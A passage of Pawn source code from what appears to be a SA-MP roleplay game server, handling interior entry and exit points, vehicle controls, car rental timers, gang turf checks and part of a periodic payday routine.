				   PlayerInfo[playerid][pInt] = 3;
			   }*/
		       else if (PlayerToPoint(2,playerid,1553.1854,-1675.8188,16.1953) && GetPlayerVirtualWorld(playerid) == 0)
		       {
		           SetPlayerPosEx(playerid,246.7732,65.1425,1003.6406);
	               SetPlayerInterior(playerid,6);
	               SetPlayerVirtualWorld(playerid,0);
	               format(string, sizeof(string), "~w~Inside the ~w~LSPD");
	               GameTextForPlayer(playerid, string, 1000, 1);
	               return 1;
		       }
		       else if (PlayerToPoint(2,playerid,2287.1047,2431.7996,10.8203))
		       {
		           SetPlayerPosEx(playerid,246.7732,65.1425,1003.6406);
	               SetPlayerInterior(playerid,6);
	               SetPlayerVirtualWorld(playerid,3);
	               format(string, sizeof(string), "~w~Inside the ~w~LVPD");
	               GameTextForPlayer(playerid, string, 1000, 1);
	               return 1;
		       }
		       else if (PlayerToPoint(2,playerid,-1593.9972,716.5457,-5.2422))//SFPD
		       {
		           SetPlayerPosEx(playerid,246.7732,65.1425,1003.6406);
	               SetPlayerInterior(playerid,6);
	               SetPlayerVirtualWorld(playerid,1015);
	               format(string, sizeof(string), "~w~Inside the ~w~SFPD");
	               GameTextForPlayer(playerid, string, 1000, 1);
	               return 1;
		       }
		       else if (PlayerToPoint(2,playerid,627.6160,-571.7920,17.6242))
		       {
		           SetPlayerPosEx(playerid,238.5496,139.3451,1003.0234);
	               SetPlayerInterior(playerid,3);
	               format(string, sizeof(string), "~w~FBI");
	               GameTextForPlayer(playerid, string, 1000, 1);
	               return 1;
		       }
			   else if (IsPlayerInRangeOfPoint(playerid,2,1456.7423,2773.3423,10.8203))//Los Aztecas
			   {
			       if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4)
			       {
			           GameTextForPlayer(playerid, "~g~Los Aztecas", 1000, 1);
			           SetPlayerInterior(playerid,6);
			           PlayerInfo[playerid][pInt] = 6;
				       SetPlayerPosEx(playerid,774.213989,-48.924297,1000.585937);
				       SetPlayerVirtualWorld(playerid, 1);
	                   InHQ[playerid] = 4;
			       }
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,726.09662, -1276.91382, 12.87074))//Grove Street
	           {
			       if(PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5)
			       {
			           GameTextForPlayer(playerid, "~g~Yakuza Family", 1000, 1);
			           SetPlayerInterior(playerid,3);
				       SetPlayerPosEx(playerid,2496.049804,-1695.238159,1014.742187);
				       InHQ[playerid] = 5;
				       SetPlayerVirtualWorld(playerid,393);
			       }
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,1455.2687,750.8684,11.0234))
	           {
			       if(PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10)
			       {
	                   SetPlayerInterior(playerid,3);
				       SetPlayerPosEx(playerid,964.106994,-53.205497,1001.124572);
				       GameTextForPlayer(playerid, "~w~Ballas HQ", 5000, 1);
				       PlayerInfo[playerid][pInt] = 3;
				       InHQ[playerid] = 10;
		           }
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,725.6769,-1440.4506,13.5391))
	           {
			       if(PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6)
			       {
	                   SetPlayerInterior(playerid,12);
				       SetPlayerPosEx(playerid,2324.2273,-1148.8241,1050.7101);
				       GameTextForPlayer(playerid, "~w~Los Vagos HQ", 5000, 1);
				       PlayerInfo[playerid][pInt] = 12;
				       InHQ[playerid] = 6;
				       SetPlayerVirtualWorld(playerid,1);
		           }
			   }
			   else if (IsPlayerInRangeOfPoint(playerid,2,1510.3986,-1059.5723,25.0625))
			   {
				   if(areape == 1)
				   {
				       SetPlayerInterior(playerid,15);
					   SetPlayerPosEx(playerid,-1423.5153,935.8321,1036.4756);
					   PlayerInfo[playerid][pInt] = 15;
					   SCM(playerid, -1, "To make weapons, type the command [/getweapons].");
					   spawnsetarea[playerid] = 1;
				   }
				   else return SCM(playerid,COLOR_SERVER,"Event area is closed.");
			   }
		   }
		   for(new i = 1; i <  sizeof(HouseInfo); i++)
		   {
			   if (PlayerToPoint(2, playerid,HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz]) && HouseInfo[i][hVirtual] == GetPlayerVirtualWorld(playerid))
		       {
				   SetPlayerVirtualWorld(playerid,0);
				   SetPlayerInterior(playerid,0);
				   SetPlayerPosEx(playerid,HouseInfo[i][hEntrancex],HouseInfo[i][hEntrancey],HouseInfo[i][hEntrancez]);
				   PlayerInfo[playerid][pInt] = 0;
				   PlayerInfo[playerid][pLocal] = 255;
				   InHouse[playerid] = -1;
				   if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			   }
		   }
		   for(new i = 1; i <  sizeof(BizzInfo); i++)
		   {
			   if (PlayerToPoint(2, playerid,BizzInfo[i][bExitX], BizzInfo[i][bExitY], BizzInfo[i][bExitZ]) && BizzInfo[i][bVirtual]==GetPlayerVirtualWorld(playerid) && BizzInfo[i][bSbiz] == 0)
			   {
				   SetPlayerInterior(playerid,0);
				   PlayerInfo[playerid][pInt] = 0;
				   SetPlayerPosEx(playerid,BizzInfo[i][bEntranceX],BizzInfo[i][bEntranceY],BizzInfo[i][bEntranceZ]);
				   PlayerInfo[playerid][pLocal] = 255;
	               SetPlayerVirtualWorld(playerid,0);
	               InBussines[playerid] = -1;
				   if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
			   }
		   }
		   if (IsPlayerInRangeOfPoint(playerid,2,1756.4181,-1577.8954,1742.5309) && PlayerInfo[playerid][pJailed] == 0)//jail
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,1798.5801,-1578.1804,14.0827);
			   PlayerInfo[playerid][pInt] = 0;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,1764.3419,-1567.7599,1742.4967)) // exit visit
		   {
			   SetPlayerPosEx(playerid,1765.1732,-1569.0253,1742.4930);
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,-2027.0515,-104.5211,1035.1719)) //nr
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,648.18,-1352.61,14.25);
			   PlayerInfo[playerid][pInt] = 0;
			   SetPlayerVirtualWorld(playerid, 0);
			   InHQ[playerid] = -1;
		   }
		   else if(IsPlayerInRangeOfPoint(playerid,2,2323.9993,-1148.0469,1050.7101) && GetPlayerVirtualWorld(playerid) == 2)//hitman
		   {
	           SetPlayerInterior(playerid,0);
			   SetPlayerVirtualWorld(playerid, 0);
			   SetPlayerPosEx(playerid,1081.1794,-345.3979,73.9825);
			   PlayerInfo[playerid][pInt] = 0;
			   InHQ[playerid] = -1;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,626.3122,-11.8606,1000.9219) && GetPlayerVirtualWorld(playerid) == 10) //tow
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,918.6766,-1252.2185,16.2109);
			   PlayerInfo[playerid][pInt] = 0;
			   SetPlayerVirtualWorld(playerid, 0);
			   InHQ[playerid] = -1;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,318.5867,1115.4735,1083.8828)) // drugs house
		   {
	           SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,2166.4771,-1671.7883,15.0743);
			   PlayerInfo[playerid][pInt] = 0;
		   }
		   else if (PlayerToPoint(4.0, playerid,1494.2838,1304.3364,1093.2891) && GetPlayerVirtualWorld(playerid) == 3) //SI
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,2435.3064,1671.0139,10.8203);
			   PlayerInfo[playerid][pInt] = 0;
			   SetPlayerVirtualWorld(playerid, 0);
			   InHQ[playerid] = -1;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,1700.9830,-1667.8865,20.2188) && GetPlayerVirtualWorld(playerid) == 5) //LS TAXI
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,1754.3792,-1894.0465,13.5569);
			   PlayerInfo[playerid][pInt] = 0;
			   SetPlayerVirtualWorld(playerid, 0);
			   InHQ[playerid] = -1;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,1494.2838,1304.3364,1093.2891) && GetPlayerVirtualWorld(playerid) == 7) //Paramedic
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,1614.92480, 1816.09631, 10.91310);
			   PlayerInfo[playerid][pInt] = 0;
			   SetPlayerVirtualWorld(playerid, 0);
			   InHQ[playerid] = -1;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,774.213989,-48.924297,1000.585937) && GetPlayerVirtualWorld(playerid) == 1) // los aztecas
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,1456.7423,2773.3423,10.8203);
			   PlayerInfo[playerid][pInt] = 0;
			   SetPlayerVirtualWorld(playerid, 0);
			   InHQ[playerid] = -1;
		   }
		   else if(IsPlayerInRangeOfPoint(playerid,2,246.5872,109.0304,1003.2188) && GetPlayerVirtualWorld(playerid) == 4) // armoury NG
		   {
		       SetPlayerInterior(playerid,0);
		       SetPlayerPosEx(playerid,157.3923,1903.2848,18.6660);
		       PlayerInfo[playerid][pInt] = 0;
		       SetPlayerVirtualWorld(playerid, 0);
		       InHQ[playerid] = -1;
	   	   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,-204.439987,-26.453998,1002.273437))
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,1090.7542,-1476.3380,22.7465);
			   PlayerInfo[playerid][pInt] = 0;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,1527.229980,-11.574499,1002.097106))
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,2307.2935,-1786.0671,13.5557);
			   PlayerInfo[playerid][pInt] = 0;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,288.8405,167.7809,1007.1719) && GetPlayerVirtualWorld(playerid) == 333) // LSPD Armoury
		   {
			   SetPlayerInterior(playerid,6);
			   SetPlayerVirtualWorld(playerid,0);
			   SetPlayerPosEx(playerid,242.8626,66.2978,1003.6406);
			   PlayerInfo[playerid][pInt] = 6;
			   PlayerInfo[playerid][pLocal] = 0;
			   InHQ[playerid] = -1;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,288.8405,167.7809,1007.1719) && GetPlayerVirtualWorld(playerid) == 343) // LVPD Armoury
		   {
			   SetPlayerInterior(playerid,6);
			   SetPlayerVirtualWorld(playerid,3);
			   SetPlayerPosEx(playerid,242.8626,66.2978,1003.6406);
			   PlayerInfo[playerid][pInt] = 6;
			   PlayerInfo[playerid][pLocal] = 0;
			   InHQ[playerid] = -1;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,1,304.5868,-141.9874,1004.0625))//gunshopusa
		   {
			   SetPlayerPosEx(playerid,305.7950,-141.8203,1004.0547);
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,1,298.8386,-141.9191,1004.0547))//gunshopusa
		   {
			   SetPlayerPosEx(playerid,300.1631,-141.8074,1004.0625);
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,1262.1383,-785.3315,1091.9063) && GetPlayerVirtualWorld(playerid) == 3)//Guvern
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,1481.1063,-1771.2532,18.7958);
			   PlayerInfo[playerid][pInt] = 0;
			   SetPlayerVirtualWorld(playerid,0);
			   InHQ[playerid] = -1;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,834.1988,7.1422,1004.1870))
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,1247.9105,-1560.4454,13.5556);
			   PlayerInfo[playerid][pInt] = 0;
		   }
		   else if (PlayerToPoint(3.0,playerid,246.7732,65.1425,1003.6406) && GetPlayerVirtualWorld(playerid) == 0)
	       {
		       SetPlayerPosEx(playerid,1553.1854,-1675.8188,16.1953);
		       SetPlayerInterior(playerid,0);
		       PlayerInfo[playerid][pInt] = 0;
		       SetPlayerVirtualWorld(playerid,0);
	           format(string, sizeof(string), "~w~LSPD");
	           GameTextForPlayer(playerid, string, 1000, 1);
		   }
		   else if (PlayerToPoint(3.0,playerid,246.7732,65.1425,1003.6406) && GetPlayerVirtualWorld(playerid) == 3)
	       {
		       SetPlayerPosEx(playerid,2287.1047,2431.7996,10.8203);
		       SetPlayerInterior(playerid,0);
		       PlayerInfo[playerid][pInt] = 0;
		       SetPlayerVirtualWorld(playerid,0);
	           format(string, sizeof(string), "~w~LVPD");
	           GameTextForPlayer(playerid, string, 1000, 1);
		   }
		   else if (PlayerToPoint(3.0,playerid,246.7732,65.1425,1003.6406) && GetPlayerVirtualWorld(playerid) == 1015) //SFPD
	       {
		       SetPlayerPosEx(playerid,-1593.9972,716.5457,-5.2422);
		       SetPlayerInterior(playerid,0);
		       PlayerInfo[playerid][pInt] = 0;
		       SetPlayerVirtualWorld(playerid,0);
	           format(string, sizeof(string), "~w~SFPD");
	           GameTextForPlayer(playerid, string, 1000, 1);
		   }
		   /*else if (PlayerToPoint(5,playerid,387.7978,173.8582,1008.3828))
	       {
		       SetPlayerPosEx(playerid,1481.1063,-1771.2532,18.7958);
		       SetPlayerVirtualWorld(playerid,0);
		       SetPlayerInterior(playerid,0);
		       PlayerInfo[playerid][pInt] = 0;
	           format(string, sizeof(string), "~w~Los Santos");
	           GameTextForPlayer(playerid, string, 1000, 1);
	       }*/
		   else if (PlayerToPoint(5,playerid,238.5496,139.3451,1003.0234) && GetPlayerVirtualWorld(playerid) == 0)
	       {
		       SetPlayerPosEx(playerid,627.6160,-571.7920,17.6242);
		       SetPlayerInterior(playerid,0);
		       PlayerInfo[playerid][pInt] = 0;
	           format(string, sizeof(string), "~w~Los Santos F.B.I");
	           GameTextForPlayer(playerid, string, 1000, 1);
	           InHQ[playerid] = -1;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,761.412963,1440.191650,1102.703125))
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,387.7978,173.8582,1008.3828);
			   PlayerInfo[playerid][pInt] = 0;
			   PlayerInfo[playerid][pLocal] = 255;
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,964.106994,-53.205497,1001.124572)) //Ballas
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,1455.2687,750.8684,11.0234);
			   PlayerInfo[playerid][pInt] = 0;
			   PlayerInfo[playerid][pLocal] = 255;
			   InHQ[playerid] = -1;
			   SetPlayerVirtualWorld(playerid, 0);
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,2324.2273,-1148.8241,1050.7101) && GetPlayerVirtualWorld(playerid) == 1) //Los Vagos
		   {
			   SetPlayerInterior(playerid,0);
			   SetPlayerPosEx(playerid,725.6769,-1440.4506,13.5391);
			   PlayerInfo[playerid][pInt] = 0;
			   PlayerInfo[playerid][pLocal] = 255;
			   InHQ[playerid] = -1;
			   SetPlayerVirtualWorld(playerid, 0);
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,2496.049804,-1695.238159,1014.742187))//Grove Street
		   {
			   GameTextForPlayer(playerid, "~w~Yakuza Family", 1000, 1);
			   SetPlayerInterior(playerid,0);
			   PlayerInfo[playerid][pInt] = 0;
			   SetPlayerPosEx(playerid,726.09662, -1276.91382, 12.87074);
			   InHQ[playerid] = -1;
			   SetPlayerVirtualWorld(playerid, 0);
		   }
		   else if (IsPlayerInRangeOfPoint(playerid,2,-1423.5153,935.8321,1036.4756))
		   {
			   if(areape == 1)
			   {
			       SetPlayerInterior(playerid,0);
				   SetPlayerPosEx(playerid,1510.3986,-1059.5723,25.0625);
				   PlayerInfo[playerid][pInt] = 0;
				   spawnsetarea[playerid] = 0;
				   ResetPlayerWeaponsEx(playerid);
				   ResetPlayerWeapons(playerid);
				   if(OnDuty[playerid] == 1)
				   {
					    GivePlayerWeaponEx(playerid, 24, 500);
						GivePlayerWeaponEx(playerid, 3, 1);
						GivePlayerWeaponEx(playerid, 41, 500);
						GivePlayerWeaponEx(playerid, 29, 1000);
						GivePlayerWeaponEx(playerid, 31, 1000);
				   }
			   }
			   else return SCM(playerid,COLOR_SERVER,"Event area is closed.");
		   }
	   }
       if(GetPlayerVehicleID(playerid) == rentls[1] || GetPlayerVehicleID(playerid) == rentls[2] || GetPlayerVehicleID(playerid) == rentls[3])
	   {
		   TogglePlayerControllable(playerid, 1);
		   RemovePlayerFromVehicle(playerid);
       }
	   if(NoFuel[playerid] == 1)
	   {
		   RemovePlayerFromVehicle(playerid);
           TogglePlayerControllable(playerid, 1);
		   NoFuel[playerid] = 0;
	   }
	   ////////////////////////////////////////////////////////////////////////////////////////////////////////GARA / 24/7///////////////////////////////////////////////////////////////////////////
	   if(PlayerToPoint(4.0, playerid, 650.36047, -609.29718, 15.69630) || PlayerToPoint(4.0, playerid, 1833.0419, -1835.5486, 12.9753) || PlayerToPoint(4.0, playerid, 317.2124, -132.4013, 1002.9965))
	   {
			if(TonomatTime[playerid] > 0) return SCM(playerid, COLOR_ERROR, "Wait 5 seconds...");
			if(GetPlayerVirtualWorld(playerid) == 0)
			{
			   if(GetPlayerCash(playerid) < 100) return SCM(playerid,COLOR_SERVER,"{FFB870}You don't have money needed.");
			   new Float:health;
			   GetPlayerHealthEx(playerid,health);
			   if(health >= 75)
			   {
				   SetPlayerHealthEx(playerid, 100);
				   ApplyAnimation(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				   GivePlayerCash(playerid, -100);
				   GameTextForPlayer(playerid, "~r~-100$", 5000, 1);
				   Update(playerid, pCashx);
				   TonomatTime[playerid]=5;
			   }
			   else
			   {
				   SetPlayerHealthEx(playerid, health+25);
				   ApplyAnimation(playerid,"FOOD","EAT_Burger", 3.0, 0, 0, 0, 0, 0);
				   GivePlayerCash(playerid, -100);
				   GameTextForPlayer(playerid, "~r~-100$", 5000, 1);
				   Update(playerid, pCashx);
				   TonomatTime[playerid] = 5;
			   }
			}
	    }
   }
   if (newkeys & KEY_ACTION)
   {
	  if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
      {
         if(GetPVarInt(playerid, "Lights") == 0)
         {
			 GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
			 SetVehicleParamsEx(veh,engine,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
			 SetPVarInt(playerid, "Lights", 1);
         }
         else if(GetPVarInt(playerid, "Lights") == 1)
         {
			 GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
			 SetVehicleParamsEx(veh,engine,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
			 SetPVarInt(playerid, "Lights", 0);
         }
      }
      return 1;
   }
   if (newkeys & KEY_ANALOG_UP)
   {
      if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
      {
         if(GetPVarInt(playerid, "Bonnet") == 0)
         {
			 GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
			 SetVehicleParamsEx(veh,engine,lights,alarm,doors,VEHICLE_PARAMS_ON,boot,objective);
			 SetPVarInt(playerid, "Bonnet", 1);
         }
         else if(GetPVarInt(playerid, "Bonnet") == 1)
         {
			 GetVehicleParamsEx(veh,engine,lights,alarm,doors,bonnet,boot,objective);
			 SetVehicleParamsEx(veh,engine,lights,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
			 SetPVarInt(playerid, "Bonnet", 0);
		 }
      }
      return 1;
   }
   return 0;
}

public OnVehicleSpawn(vehicleid)
{
    if(!IsAnOwnableCar(vehicleid))
	{
		Gas[vehicleid] = 100;
  	}
  	else
  	{
  	    new engine,lights,alarm,doors,bonnet,boot,objective;
		if(CarInfo[OwnedVeh(vehicleid)][cLock] == 1)
		{
			GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
  	    	SetVehicleParamsEx(vehicleid,engine,lights,alarm,1,bonnet,boot,objective);
		}
		if(CarInfo[OwnedVeh(vehicleid)][cLock] == 0)
		{
			GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
  	    	SetVehicleParamsEx(vehicleid,engine,lights,alarm,0,bonnet,boot,objective);
		}
		ChangeVehiclePaintjob(vehicleid, CarInfo[OwnedVeh(vehicleid)][cPaintJ]);
		ModVehicle(vehicleid);
		SetVehicleNumberPlate(vehicleid,CarInfo[OwnedVeh(vehicleid)][cLicense]);
		vUpdate(OwnedVeh(vehicleid), cKMx);
  	}
  	vehRadio[vehicleid] = 0;
	return 1;
}
forward nopaydaybug();
public nopaydaybug()
{
    paydayacordat = 0;
    printf("No PayDay bug: Succesfully initialized.");
	return 1;
}
public SendMSG()
{
	foreach(Player, playerid)
	{
		if(PlayerInfo[playerid][pLanguage] == 2)
		{
	    	new randMSG = random(sizeof(RandomMSG));
	    	SendClientMessage(playerid, COLOR_SERVER, RandomMSG[randMSG]);
		}
		else if(PlayerInfo[playerid][pLanguage] == 1)
		{
	    	new randMSGENG = random(sizeof(RandomMSGENG));
	    	SendClientMessage(playerid, COLOR_SERVER, RandomMSGENG[randMSGENG]);
		}
	}
}
public RentTimer(playerid)
{
	RentTime[playerid]++;
	TotalTimeRent[playerid]++;
	if(GetPlayerCash(playerid) < 20)
	{
		VehicleRent[RentVeh[playerid]] = -1;
		RentTime[playerid] = 0;
		TotalTimeRent[playerid] = 0;
		RentVeh[playerid] = -1;
		KillTimer(RentTimerr[playerid]);
		PlayerTextDrawHide(playerid, RentCar[playerid]);
	}
	if(RentTime[playerid] == 10)
	{
		new veh = GetPlayerVehicleID(playerid),str2[256],string[64];
		GivePlayerCash(playerid, -20);
		Update(playerid, pCashx);
		RentTime[playerid] = 0;
		format(string,sizeof(string),"rentcar cost: ~g~$%d",TotalTimeRent[playerid]*2);
		PlayerTextDrawSetString(playerid, RentCar[playerid], string);
		PlayerTextDrawShow(playerid, RentCar[playerid]);
		if(rentls[1] == veh || rentls[2] == veh || rentls[3] == veh || rentls[4] == veh || rentls[5] == veh || rentls[6] == veh || rentls[7] == veh || rentls[8] == veh || rentls[9] == veh
		|| rentlv[1] == veh || rentlv[2] == veh || rentlv[3] == veh || rentlv[4] == veh || rentlv[5] == veh || rentlv[6] == veh || rentlv[7] == veh || rentlv[8] == veh || rentlv[9] == veh || rentlv[10] == veh || rentlv[11] == veh || rentlv[12] == veh || rentlv[13] == veh
		|| rentlv[14] == veh || rentlv[15] == veh || rentlv[16] == veh || rentlv[17] == veh || rentlv[18] == veh || rentlv[19] == veh)
		{
			BizzInfo[31][bTill] += 20;
			mysql_format(SQL,str2,sizeof(str2),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='31'",BizzInfo[31][bTill]);
			mysql_tquery(SQL,str2,"","");
		}
	}
	return 1;
}

public IsPlayerInArea(playerid, Float:minx, Float:miny, Float:maxx, Float:maxy)
{
   new Float:x, Float:y, Float:z;
   GetPlayerPos(playerid, x, y, z);
   if (x > minx && x < maxx && y > miny && y < maxy) return 1;
   return 0;
}

public IsPlayerInTurf(playerid, turfid)
{
	if(IsPlayerConnected(playerid))
	{
		if(turfid == -1)
		{
			return 0;
		}
		new Float:x, Float:y, Float:z;
		GetPlayerPos(playerid,x,y,z);
		if(x >= TurfInfo[turfid][zMinX] && x < TurfInfo[turfid][zMaxX] && y >= TurfInfo[turfid][zMinY] && y < TurfInfo[turfid][zMaxY])
		{
	 		return 1;
		}
	}
	return 0;
}

public GetPlayerTurf(playerid)
{
    for(new i = 1; i < sizeof(Turfs); i++)
    {
        if(IsPlayerInTurf(playerid, i))
        {
            return i;
        }
    }
    return -1;
}

public Production()
{
	foreach(Player,i)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerDrunk[i] > 0)
			{
			    PlayerDrunk[i] = 0;
		     	PlayerDrunkTime[i] = 0;
	    		GameTextForPlayer(i, "~p~Drunk effect~n~~w~Gone", 3500, 1);
	    		SetPlayerDrunkLevel(i, 0);
			}
		}
    /*new query[300],playerid,giverid,actionid,actiontime,complaint,reason[64],stringg[256],playername[30],givername[30],var100[300],dm,reason2[64];
  	format(query, sizeof(query), "SELECT * FROM `clans` WHERE `clanExpire` < '%d' AND `clanActive`='1' ORDER BY `clanID`",gettime());
	new Cache: stringresult8 = mysql_query(SQL, query);
	if(cache_get_row_count() > 0)
	{
		new pid,clanid;
		clanid = cache_get_field_content_int(0, "clanID");
		foreach(Player, id)
		{
			if(PlayerInfo[id][pClan] == clanid)
			{
				if(PlayerInfo[id][pCRank] < 7)
				{
					new stringname[128];
					SetPlayerName(id, PlayerInfo[id][pNormalName]);
					format(stringname,sizeof(stringname),"%s / RPG.Magic-Gaming.tk",PlayerInfo[id][pNormalName]);
					PlayerTextDrawSetString(id, logo[id], stringname);
					PlayerTextDrawShow(id, logo[id]);
					PlayerInfo[id][pClan] = 0;
					PlayerInfo[id][pCRank] = 0;
					PlayerInfo[id][pCWarns] = 0;
					PlayerInfo[id][pClanTag] = 0;
				}
			}
		}
		format(query, sizeof(query), "SELECT * FROM `users` WHERE `Clan` = '%d'",clanid);
		new Cache: stringresult9 = mysql_query(SQL, query);
		for(new id, jd = cache_get_row_count (); id != jd; ++id)
		{
			pid = cache_get_field_content_int(id, "id");
			mysql_format(SQL, var100, sizeof(var100), "INSERT INTO `emails` (`playerid`,`Message`) VALUES('%d','Deoarece clanul a expirat toti membrii au fost dati afara, in afara de lider.')",pid);
			mysql_tquery(SQL,var100,"","");
		}
		cache_delete(stringresult9);
		mysql_format(SQL, var100, sizeof(var100), "UPDATE `users` SET `Clan`='0',`CRank`='0',`ClanTag`='0',`CWarns`='0' WHERE `Clan`='%d' AND `CRank` < '7'",clanid);
		mysql_tquery(SQL,var100,"","");
		mysql_format(SQL, var100, sizeof(var100), "UPDATE `clans` SET `clanActive`='0' WHERE `clanID`='%d'",clanid);
		mysql_tquery(SQL,var100,"","");
	}
	cache_delete(stringresult8);*/
	}
	return 1;
}

public PayDay()
{
	new string[512],
		str[256],
		string3[512],
		interest,
		hour,
		minn,
		sec,
		expamount,
		rent[MAX_PLAYERS];
	gettime(hour,minn,sec);
	if(zapada == 1)
	{
		MAX_SNOW = 1 + random(1);
		new randzapada = 0 + random(1);
		if(randzapada == 1)
		{
			zapada = 0;
			for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(zapada == 1)
					{
						DestroySnow(i);
						if(IsPlayerInArea(i, 44.60, -2892.90, 2997.00, -768.00))
						{
							CreateSnow(i);
						}	
					}
					if(zapada == 0)
					{
						DestroySnow(i);
					}
				}	
			}
		}
	}	
	for(new i = 0; i < MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(PlayerInfo[i][pLevel] >= 0)
		    {
            	new wakaname[25];
                GetPlayerName(i,wakaname,sizeof(wakaname));
			    if(MoneyMessage[i]==1)
				{
				    SendClientMessage(i, COLOR_ERROR, "You failed to pay your debt, Jail time.");
                    new rand;
					rand = random(sizeof(gRandomJailSpawns));
					SetPlayerInterior(i, 6);
					SetPlayerPosEx(i,gRandomJailSpawns[rand][0],gRandomJailSpawns[rand][1],gRandomJailSpawns[rand][2]);
		            PlayerInfo[i][pJailed] = 1;
		            ResetPlayerWeaponsEx(i);
		            ResetPlayerWeapons(i);
					WantedPoints[i] = 0;
					PlayerInfo[i][pJailTime] = 240;
					format(string, sizeof(string), "You are jailed for %d seconds.   Bail: Unable", PlayerInfo[i][pJailTime]);
					SendClientMessage(i, COLOR_LIGHTBLUE, string);
					Update(i,pJailedx);
					Update(i,pJailTimex);
					TogglePlayerControllable(i, 0);
					SetTimerEx("UnFreezeStation", 1000, false, "i", i);
				}
				new tmpintrate;
				if(PlayerInfo[i][pPremiumAccount] == 1)
				{
					tmpintrate = 2;
	    			new bonus = PlayerInfo[i][pPayCheck] / 2;
				    PlayerInfo[i][pPayCheck] += bonus;
				}
				else
				{
					tmpintrate = 1;
				}
				if(PlayerInfo[i][pVip] == 1)
				{
					bonus5ore[i]++;
					tmpintrate += 3;
					if(bonus5ore[i] == 5)
					{
						new randomrp = 3 + 7;
						PlayerInfo[i][pExp] += randomrp;
						format(string, sizeof(string), "VIP Bonus: {FFFFFF}Did you get bonus %d Points of respect because you played 5:00 continues.",randomrp);
						SCM(i, COLOR_ORANGE, string);
					}
				}
				Tax += TaxValue;
    			addVV(PlayerInfo[i][pBAccLY], PlayerInfo[i][pBAcc], TaxValue);
				new checks = PlayerInfo[i][pPayCheck];
    			addVV(PlayerInfo[i][pBAccLY], PlayerInfo[i][pBAcc], checks);
				interest = 15000+random(15000)*(tmpintrate);
				new finalinterest;
				SendClientMessage(i, COLOR_TEAL, "----------------------------------------------------------------------------");
				SendClientMessage(i, COLOR_SERVER, "Your paycheck has arrived; please visit the bank to withdraw your money.");
				if(PlayerInfo[i][pRob] < 20)
    			{
       				PlayerInfo[i][pRob]++;
           		}
           		else
           		{
           		    SendClientMessage(i, COLOR_SERVER, "You have not received any slave/free point because you already have 20 slave/free points.");
				}
                if(PlayerInfo[i][pPayDay] >= 1800 || PlayerInfo[i][pVip] == 1)
				{
				    PlayerInfo[i][pConnectTime] += 1;
					PlayerInfo[i][pPaydayuri] += 1;
				    PlayerInfo[i][pGPoints] += 1;
					Update(i, pGPointsx);
				    finalinterest = interest;
				    PlayerInfo[i][pPayDay] = 0;
				    if(PlayerInfo[i][pGiftTime] > 0)
				    {
				        PlayerInfo[i][pGiftTime] -= 1;
				        Update(i, pGiftTimex);
					}
				}
				else
				{
				    finalinterest = interest / 2;
				    new stringsu[256];
